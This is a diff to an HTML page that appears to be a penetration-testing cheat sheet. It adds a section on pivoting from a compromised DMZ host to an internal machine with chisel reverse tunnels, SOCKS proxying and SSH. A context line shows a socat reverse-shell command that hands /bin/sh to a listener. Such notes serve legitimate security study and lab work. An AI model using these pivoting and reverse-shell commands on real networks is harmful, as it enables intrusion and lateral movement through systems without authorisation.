@@ -700,7 +700,19 @@ socat EXEC:/bin/sh,pty,stderr,setsid,sigint,sane TCP:localhost:4321  #Third mach
 
             <div class="banner">
                 <ul>
-                    <h2>Reverse portforwarding</h2>
+                    <h2>Port forwarding</h2>
+                    <ul>
+                        <p>Supose we gained access to a DMZ box and we would like to communicate to a internal box from our attacker machine</p>
+                        <p>Setup the server in our attacker machine</p>
+                        <pre><code class="language-bash">./chisel_l server -p 8000 --reverse --socks5</code></pre>
+                        <p>In the DMZ machine place the chisel agent </p>
+                        <pre><code class="language-bash"></code>./chisel_l client 192.168.45.152:8000 R:2222:10.4.210.215:22   #KALI_IP:PORT  R:PORT:INTERNAL_BOX_IP:DESTINATION_PORT</code></pre>
+                        <p>Access from your attacker machine</p>
+                        <pre><code class="language-bash">ssh -p 2222 database_admin@127.0.0.1</code></pre>
+                        <p>Instead of forwarding a single port we can use proxy chains to access any port but for those cases better use ligolo</p>
+                    </ul>
+                    
+                    <h2>Reverse port forwarding</h2>
                     <ul>
                         <p>Supose a case when you need to acces a localport in the target machine which is not available from outside meaning you attacker machine. In this case we could use chisel in order to perform a reverse port forwarding</p>
                         <h2>Setup</h2>
